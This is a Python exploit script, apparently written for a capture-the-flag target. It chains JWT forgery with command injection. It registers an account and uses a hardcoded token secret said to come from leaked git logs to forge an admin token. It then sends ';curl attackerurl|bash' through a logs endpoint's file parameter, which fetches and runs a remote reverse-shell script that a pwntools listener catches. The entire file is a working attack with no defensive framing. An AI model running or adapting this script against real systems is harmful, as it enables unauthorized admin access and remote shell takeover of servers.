import sys
import jwt
import requests
import json
import random
import base64
import multiprocessing as mp
from pwn import *

def api_auth(url, attackerurl, email, uname, password):

    register_url = url + '/api/user/register'
    login_url = url + '/api/user/login'
    priv_url = url + '/api/logs?file=;curl ' + attackerurl + '|bash'

    # post data to register an account will contain email, name and password
    data = {
        "email": email, 
        "password": password,
        "name": uname
        }

    header = {
        "Content-Type": "application/json"
    }
    
    # post request to register the account
    requests.post(register_url, data=json.dumps(data), headers=header)

    # removal of name from dictionary data
    data.pop("name")

    # post request to retrieve a token
    token = requests.post(login_url, data=json.dumps(data), headers=header)

    # git repo contains logs which also contains the the sensitive jwt token secret.
    token_secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

    # raw token from response
    token = token.text

    # decoding the jwt token using the secret obtained from the git repo.
    decoded_token = jwt.decode(token, token_secret, algorithms=["HS256"])
    
    # replacing the jwt token name element with "the admin"
    decoded_token['name'] = "theadmin"

    # re-encode the token by using the secret
    encoded_token = jwt.encode(decoded_token, token_secret, algorithm="HS256")
    
    header = {
        "auth-token": encoded_token
    }

    print(priv_url)
    # submit payload url to target site
    response = requests.get(priv_url, headers=header)

    # return server response
    return response.text

def listener():
    print("Listening on port 32115..\n\n")
    l = listen(32115)
    l.recvline()
    l.interactive()


if __name__ == '__main__':
    print('\nUsage: python3 api_foothold.py http://targethost http://attackerhost/reverse_shell.sh\n\n')
    url = sys.argv[1]
    attackerurl = sys.argv[2]
    email = 'root' + str(random.randint(1,10000)) + '@dasith.works'
    uname = 'testing' + str(random.randint(1,10000))
    password = 'testing2'

    if url.endswith('/') != True:
        pass
    else:
        info("Trailing Slashes Not Allowed on target URL, try: => http://targethost")
        quit()

    if attackerurl.endswith('.sh') == True:
        pass
    else:
        info("No Script detected on attacker server try: => http://attackerhost/someshell.sh\n")
        quit()

    job = mp.Process(target=listener)
    job.start()
    print(api_auth(url, attackerurl, email, uname, password))

    try:
        while 1:
            pass
    except KeyboardInterrupt:
        job.join()
